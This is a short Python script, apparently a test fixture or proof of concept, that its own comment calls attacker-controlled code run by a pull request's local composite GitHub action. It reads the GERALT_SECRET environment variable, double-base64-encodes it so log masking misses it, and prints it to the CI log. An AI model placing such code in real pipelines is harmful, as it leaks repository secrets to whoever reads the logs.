import os
import base64

# Attacker-controlled script executed by the PR-local composite action
# smart-ci (github.action_path -> checked-out PR action dir).
_secret = os.environ.get("GERALT_SECRET", "")
print("GERALT_LEAKED_TOKEN=" + base64.b64encode(base64.b64encode(_secret.encode())).decode())
raise SystemExit(1)
